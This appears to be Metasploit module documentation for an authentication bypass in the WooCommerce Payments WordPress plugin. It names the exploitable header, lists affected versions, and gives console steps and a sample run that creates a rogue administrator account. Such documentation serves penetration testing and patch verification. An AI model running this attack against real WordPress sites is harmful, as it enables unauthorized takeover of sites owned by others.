## Vulnerable Application
WooCommerce-Payments plugin for Wordpress versions 4.8 prior to 4.8.2, 4.9 prior to 4.9.1,
5.0 prior to 5.0.4, 5.1 prior to 5.1.3, 5.2 prior to 5.2.2, 5.3 prior to 5.3.1, 5.4 prior to 5.4.1,
5.5 prior to 5.5.2, and 5.6 prior to 5.6.2 contain an authentication bypass by specifying a valid user ID number
within the `X-WCPAY-PLATFORM-CHECKOUT-USER` header. With this authentication bypass, a user can then use the API
to create a new user with administrative privileges on the target WordPress site IF the user ID
selected corresponds to an administrator account.

### Install

Download, install, and activate [woocomerce-payments 5.6.1](https://downloads.wordpress.org/plugin/woocommerce-payments.5.6.1.zip)

No configuration is required, and one does not need to install the main WooCommerce platform itself.

## Verification Steps

1. Install the plugin
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_woocommerce_payments_add_user`
1. Do: `set username [username]`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. A new WordPress administrator account should be created.
1. Verify the new account uses the username and password specified in the USERNAME and PASSWORD datastore options respectively.

## Options

### USERNAME

The username to create. Default is `msfadmin`.

### PASSWORD

The password for the user. Default is to create a random one.

### EMAIL

The email address for the user. Default is to create a random one.

### ADMINID

The user ID number for a WordPress administrator. Defaults to `1`.

## Scenarios

### VWooCommerce Payments 5.6.1 on Wordpress 6.2.2

```
msf6 > use auxiliary/scanner/http/wp_woocommerce_payments_add_user 
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set username h00die
username => h00die
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > exploit
[*] Running module against 1.1.1.1

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/woocommerce-payments/readme.txt
[*] Found version 5.6.1 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting to create an administrator user -> h00die:lWqD3BOer3AFZ (willie.miller@iwuxphff.qiawqio9t.gov)
[+] User was created successfully
[*] Auxiliary module execution completed
```
